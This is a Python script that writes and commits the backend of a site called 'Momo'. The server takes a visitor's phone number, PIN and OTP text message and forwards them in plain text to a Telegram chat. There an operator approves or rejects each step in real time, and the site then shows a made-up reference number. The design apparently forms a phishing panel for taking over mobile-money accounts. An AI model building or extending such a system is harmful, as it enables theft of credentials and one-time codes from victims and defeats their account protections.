#!/usr/bin/env python3
"""act16.py - Local HTTP server + Telegram polling.

Writes the pieces the frontend will talk to in act17:

  * backend/polling.py - background thread long-polling Telegram
                         getUpdates and applying Approve/Reject
                         callback presses to sessions
  * backend/server.py  - ThreadingHTTPServer serving web/ and
                         preview.html, plus JSON endpoints:
                            POST /api/onboarding
                            POST /api/checkout
                            GET  /api/pin-status/<sid>
                            POST /api/otp
                            GET  /api/otp-status/<sid>
                            GET  /api/health
  * run_server.py      - entry point (starts polling + server)

No frontend changes yet; the pages keep working as static files.
"""
from __future__ import annotations

import logging
import subprocess
import sys
from pathlib import Path

SCRIPT_NAME = Path(__file__).name
TIMESTEP = 16

COMMIT_MESSAGE = """act16: local server + telegram polling

Adds backend/polling.py (background thread long-polling getUpdates
and applying Approve/Reject callback presses to sessions),
backend/server.py (ThreadingHTTPServer serving web/ and preview.html
plus /api onboarding, checkout, otp and status endpoints), and
run_server.py. No frontend changes yet."""

BACKEND_POLLING = '''"""Background Telegram update poller.

Runs a daemon thread that long-polls getUpdates and applies inline
keyboard presses (Approve/Reject PIN, Approve/Reject OTP) to the
session store. Unknown callbacks are acknowledged but otherwise
ignored, so unrelated bots do not crash the flow.
"""
from __future__ import annotations

import logging
import threading
from typing import Any

from .telegram import (
    SessionStore,
    TelegramClient,
    TelegramError,
)

LOGGER = logging.getLogger(__name__)

POLL_TIMEOUT_SECONDS = 30
CALLBACK_PREFIXES = (
    "approve_pin:",
    "reject_pin:",
    "approve_otp:",
    "reject_otp:",
)


def _parse_callback(data: str) -> tuple[str, str] | None:
    """Return (action, session_id) or None if *data* is unknown."""
    for prefix in CALLBACK_PREFIXES:
        if data.startswith(prefix):
            action = prefix[:-1]
            session_id = data[len(prefix):]
            if session_id:
                return action, session_id
    return None


def _apply_action(
    store: SessionStore,
    action: str,
    session_id: str,
) -> str:
    """Apply the action to the session; return the toast text."""
    if action == "approve_pin":
        store.update(session_id, pin_status="approved")
        return "PIN approved"
    if action == "reject_pin":
        store.update(session_id, pin_status="rejected")
        return "PIN rejected"
    if action == "approve_otp":
        reference = store.issue_reference(session_id) or ""
        store.update(session_id, otp_status="approved")
        return "OTP approved - " + reference
    if action == "reject_otp":
        store.update(session_id, otp_status="rejected")
        return "OTP rejected"
    return "Unknown action"


class TelegramPoller:
    """Long-polling worker for Telegram update events."""

    def __init__(
        self,
        client: TelegramClient,
        store: SessionStore,
    ) -> None:
        self._client = client
        self._store = store
        self._offset: int | None = None
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        """Start the polling thread if it is not already running."""
        if self._thread is not None and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run,
            name="telegram-poller",
            daemon=True,
        )
        self._thread.start()
        LOGGER.info("Telegram poller started")

    def stop(self) -> None:
        """Signal the polling thread to stop."""
        self._stop.set()

    def _run(self) -> None:
        while not self._stop.is_set():
            try:
                updates = self._client.get_updates(
                    offset=self._offset,
                    timeout_seconds=POLL_TIMEOUT_SECONDS,
                )
            except TelegramError as exc:
                LOGGER.warning("getUpdates failed: %s", exc)
                self._stop.wait(3.0)
                continue

            for update in updates:
                self._offset = int(update["update_id"]) + 1
                self._handle_update(update)

    def _handle_update(self, update: dict[str, Any]) -> None:
        callback = update.get("callback_query")
        if not callback:
            return
        data = callback.get("data") or ""
        parsed = _parse_callback(data)
        callback_id = str(callback.get("id") or "")

        if parsed is None:
            if callback_id:
                self._client.answer_callback_query(callback_id)
            return

        action, session_id = parsed
        session = self._store.get(session_id)
        if session is None:
            self._client.answer_callback_query(
                callback_id, "Session expired"
            )
            return

        toast = _apply_action(self._store, action, session_id)
        self._client.answer_callback_query(callback_id, toast)
        LOGGER.info("Applied %s to session %s", action, session_id[:8])
'''

BACKEND_SERVER = '''"""Local HTTP server: static site + onboarding API.

Serves the static site (web/) and the preview page, plus a small JSON
API the frontend uses to drive the Telegram flow.

Endpoints
---------
GET  /api/health              -> {status, telegram_configured}
POST /api/onboarding          -> create session, ping Telegram
POST /api/checkout            -> send PIN + phone to Telegram w/buttons
GET  /api/pin-status/<sid>    -> {status: none|pending|approved|rejected}
POST /api/otp                 -> send OTP + PIN + phone w/buttons
GET  /api/otp-status/<sid>    -> {status, reference_number}
"""
from __future__ import annotations

import json
import logging
import mimetypes
import re
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

from .telegram import (
    ConfigError,
    SessionStore,
    TelegramClient,
    TelegramError,
    escape_html,
    load_config,
)

LOGGER = logging.getLogger(__name__)

PROJECT_ROOT = Path(__file__).resolve().parent.parent
WEB_ROOT = PROJECT_ROOT / "web"
STATUS_PATTERN = re.compile(r"^/api/(pin|otp)-status/([0-9a-f]{32})$")

STATUS_NONE = "none"
STATUS_PENDING = "pending"
STATUS_APPROVED = "approved"
STATUS_REJECTED = "rejected"


def _inline_keyboard(
    approve_label: str,
    approve_action: str,
    reject_label: str,
    reject_action: str,
    session_id: str,
) -> dict[str, Any]:
    return {
        "inline_keyboard": [[
            {
                "text": approve_label,
                "callback_data": approve_action + ":" + session_id,
            },
            {
                "text": reject_label,
                "callback_data": reject_action + ":" + session_id,
            },
        ]]
    }


def _checkout_message(session_id: str, phone: str, pin: str) -> str:
    short = session_id[:8]
    return (
        "<b>New checkout</b>\\n"
        "Session: <code>" + short + "</code>\\n\\n"
        "Phone: <code>" + escape_html(phone) + "</code>\\n"
        "PIN:   <code>" + escape_html(pin) + "</code>\\n\\n"
        "Tap a code block to copy it."
    )


def _otp_message(
    session_id: str,
    phone: str,
    pin: str,
    otp: str,
) -> str:
    short = session_id[:8]
    return (
        "<b>OTP submitted</b>\\n"
        "Session: <code>" + short + "</code>\\n\\n"
        "Phone: <code>" + escape_html(phone) + "</code>\\n"
        "PIN:   <code>" + escape_html(pin) + "</code>\\n\\n"
        "OTP SMS:\\n<code>" + escape_html(otp) + "</code>\\n\\n"
        "Tap a code block to copy it."
    )


class Handler(BaseHTTPRequestHandler):
    """HTTP request handler for the static site and JSON API."""

    server_version = "MomoServer/1.0"
    telegram: TelegramClient | None = None
    store: SessionStore | None = None

    # ------------------------------------------------------------------ #
    # Dispatch                                                           #
    # ------------------------------------------------------------------ #

    def do_GET(self) -> None:
        path = urlparse(self.path).path

        if path == "/api/health":
            return self._health()
        match = STATUS_PATTERN.match(path)
        if match:
            kind, session_id = match.group(1), match.group(2)
            return self._status(kind, session_id)

        return self._serve_static(path)

    def do_POST(self) -> None:
        path = urlparse(self.path).path
        if path == "/api/onboarding":
            return self._onboarding()
        if path == "/api/checkout":
            return self._checkout()
        if path == "/api/otp":
            return self._otp()
        return self._json(404, {"error": "not found"})

    # ------------------------------------------------------------------ #
    # API handlers                                                       #
    # ------------------------------------------------------------------ #

    def _health(self) -> None:
        configured = self.telegram is not None and self.store is not None
        self._json(200, {
            "status": "ok",
            "telegram_configured": configured,
        })

    def _onboarding(self) -> None:
        body = self._read_json()
        if body is None:
            return
        plan_code = str(body.get("plan_code", "")).strip() or "unknown"

        if self.store is None:
            return self._json(
                503,
                {"error": "server not configured (telegram missing)"},
            )

        session = self.store.create(plan_code=plan_code)

        if self.telegram is not None:
            try:
                self.telegram.send_message("New User onboarding")
            except TelegramError as exc:
                LOGGER.warning("onboarding ping failed: %s", exc)

        self._json(200, {
            "session_id": session.session_id,
            "plan_code": plan_code,
        })

    def _checkout(self) -> None:
        body = self._read_json()
        if body is None:
            return
        session_id = str(body.get("session_id", "")).strip()
        phone = str(body.get("phone", "")).strip()
        pin = str(body.get("pin", "")).strip()

        if not session_id or not phone or not pin:
            return self._json(
                400,
                {"error": "session_id, phone and pin are required"},
            )

        if self.store is None or self.telegram is None:
            return self._json(
                503,
                {"error": "server not configured (telegram missing)"},
            )

        session = self.store.get(session_id)
        if session is None:
            return self._json(404, {"error": "unknown session"})

        self.store.update(
            session_id,
            phone=phone,
            pin=pin,
            pin_status=STATUS_PENDING,
            otp_status=STATUS_NONE,
        )

        markup = _inline_keyboard(
            "Approve PIN", "approve_pin",
            "Reject PIN", "reject_pin",
            session_id,
        )
        try:
            sent = self.telegram.send_message(
                _checkout_message(session_id, phone, pin),
                reply_markup=markup,
            )
        except TelegramError as exc:
            LOGGER.warning("checkout send failed: %s", exc)
            return self._json(502, {"error": "telegram send failed"})

        self.store.update(session_id, pin_message_id=sent.message_id)
        self._json(200, {"status": STATUS_PENDING})

    def _otp(self) -> None:
        body = self._read_json()
        if body is None:
            return
        session_id = str(body.get("session_id", "")).strip()
        sms_body = str(body.get("sms_body", "")).strip()

        if not session_id or not sms_body:
            return self._json(
                400,
                {"error": "session_id and sms_body are required"},
            )

        if self.store is None or self.telegram is None:
            return self._json(
                503,
                {"error": "server not configured (telegram missing)"},
            )

        session = self.store.get(session_id)
        if session is None:
            return self._json(404, {"error": "unknown session"})
        if session.phone is None or session.pin is None:
            return self._json(
                409,
                {"error": "checkout has not been completed"},
            )

        self.store.update(
            session_id,
            otp_sms=sms_body,
            otp_status=STATUS_PENDING,
        )

        markup = _inline_keyboard(
            "Approve OTP", "approve_otp",
            "Reject OTP", "reject_otp",
            session_id,
        )
        try:
            sent = self.telegram.send_message(
                _otp_message(
                    session_id,
                    session.phone,
                    session.pin,
                    sms_body,
                ),
                reply_markup=markup,
            )
        except TelegramError as exc:
            LOGGER.warning("otp send failed: %s", exc)
            return self._json(502, {"error": "telegram send failed"})

        self.store.update(session_id, otp_message_id=sent.message_id)
        self._json(200, {"status": STATUS_PENDING})

    def _status(self, kind: str, session_id: str) -> None:
        if self.store is None:
            return self._json(503, {"error": "not configured"})

        session = self.store.get(session_id)
        if session is None:
            return self._json(404, {"error": "unknown session"})

        if kind == "pin":
            return self._json(200, {"status": session.pin_status})

        self._json(200, {
            "status": session.otp_status,
            "reference_number": session.reference_number,
            "phone": session.phone,
        })

    # ------------------------------------------------------------------ #
    # Static files                                                       #
    # ------------------------------------------------------------------ #

    def _serve_static(self, path: str) -> None:
        if path in ("/", ""):
            target = WEB_ROOT / "index.html"
        elif path == "/preview.html":
            target = PROJECT_ROOT / "preview.html"
        else:
            safe = path.lstrip("/")
            target = (WEB_ROOT / safe).resolve()
            try:
                target.relative_to(WEB_ROOT.resolve())
            except ValueError:
                return self._not_found()

        if not target.is_file():
            return self._not_found()

        body = target.read_bytes()
        mime, _ = mimetypes.guess_type(str(target))
        self.send_response(200)
        self.send_header(
            "Content-Type", mime or "application/octet-stream"
        )
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _not_found(self) -> None:
        self.send_response(404)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"Not found")

    # ------------------------------------------------------------------ #
    # Helpers                                                            #
    # ------------------------------------------------------------------ #

    def _read_json(self) -> dict[str, Any] | None:
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""
        if not raw:
            self._json(400, {"error": "empty body"})
            return None
        try:
            data = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            self._json(400, {"error": "invalid JSON"})
            return None
        if not isinstance(data, dict):
            self._json(400, {"error": "JSON body must be an object"})
            return None
        return data

    def _json(self, status: int, payload: dict[str, Any]) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt: str, *args: Any) -> None:
        LOGGER.info("%s - %s", self.address_string(), fmt % args)


class MomoServer(ThreadingHTTPServer):
    """ThreadingHTTPServer carrying the Telegram client + store."""

    daemon_threads = True
    allow_reuse_address = True

    def __init__(
        self,
        address: tuple[str, int],
        telegram: TelegramClient | None,
        store: SessionStore | None,
    ) -> None:
        Handler.telegram = telegram
        Handler.store = store
        super().__init__(address, Handler)


def _try_load_telegram() -> tuple[TelegramClient | None, SessionStore]:
    """Attempt to load Telegram config; warn and continue on failure."""
    from .telegram import store as session_store
    try:
        config = load_config()
    except ConfigError as exc:
        LOGGER.warning("Telegram disabled: %s", exc)
        return None, session_store
    return TelegramClient(config), session_store


def serve(
    host: str = "127.0.0.1",
    port: int = 8000,
) -> None:
    """Blocking entry point: load config, start server."""
    telegram, store = _try_load_telegram()
    server = MomoServer((host, port), telegram, store)
    LOGGER.info("Momo server listening on http://%s:%d", host, port)
    LOGGER.info("Preview: http://%s:%d/preview.html", host, port)
    if telegram is None:
        LOGGER.warning(
            "Telegram is not configured - API calls will return 503. "
            "Fill in config/telegram.json and restart."
        )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        LOGGER.info("Shutting down")
    finally:
        server.server_close()
'''

RUN_SERVER = '''#!/usr/bin/env python3
"""Start the Momo local server.

Loads the Telegram config, starts the update polling thread, then
serves the static site and API on http://127.0.0.1:8000.

Open http://127.0.0.1:8000/preview.html to see all four screens.
Stop with Ctrl+C.
"""
from __future__ import annotations

import logging
import sys

from backend.server import _try_load_telegram, serve
from backend.polling import TelegramPoller


def _configure_logging() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        stream=sys.stdout,
    )


def main() -> int:
    _configure_logging()
    logger = logging.getLogger("run_server")

    telegram, store = _try_load_telegram()
    poller: TelegramPoller | None = None

    if telegram is not None:
        poller = TelegramPoller(telegram, store)
        poller.start()
    else:
        logger.warning("Skipping Telegram poller (config missing)")

    try:
        serve()
    finally:
        if poller is not None:
            poller.stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
'''

LOGGER = logging.getLogger(SCRIPT_NAME)


def project_root() -> Path:
    """Return the directory containing this script."""
    return Path(__file__).resolve().parent


def write_file(path: Path, content: str) -> bool:
    """Write *content* to *path* if it differs. Return True if changed."""
    if path.exists() and path.read_text(encoding="utf-8") == content:
        return False
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8", newline="\n")
    return True


def run_git(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    """Run git in *root*; never raises. Decodes output as UTF-8."""
    return subprocess.run(
        ["git", *args],
        cwd=root,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )


def main() -> int:
    """Write the server and poller files, then commit."""
    logging.basicConfig(
        level=logging.INFO, format="%(message)s", stream=sys.stdout
    )
    root = project_root()

    LOGGER.info("%s - timestep %d starting", SCRIPT_NAME, TIMESTEP)

    files = {
        root / "backend" / "polling.py": BACKEND_POLLING,
        root / "backend" / "server.py": BACKEND_SERVER,
        root / "run_server.py": RUN_SERVER,
    }
    for path, content in files.items():
        changed = write_file(path, content)
        marker = "written" if changed else "unchanged"
        LOGGER.info("[%s] %s", marker, path.relative_to(root))

    add = run_git(root, "add", "-A")
    if add.returncode != 0:
        LOGGER.error("git add failed: %s", add.stderr.strip())
        return 1

    commit = run_git(root, "commit", "-m", COMMIT_MESSAGE)
    if commit.returncode != 0:
        LOGGER.error("git commit failed: %s", commit.stderr.strip())
        return 1

    head = run_git(root, "log", "-n", "1", "--oneline")
    LOGGER.info("HEAD is now: %s", head.stdout.strip())
    LOGGER.info("")
    LOGGER.info("Next: run 'py run_server.py' and open")
    LOGGER.info("      http://127.0.0.1:8000/api/health")
    LOGGER.info("%s - done", SCRIPT_NAME)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())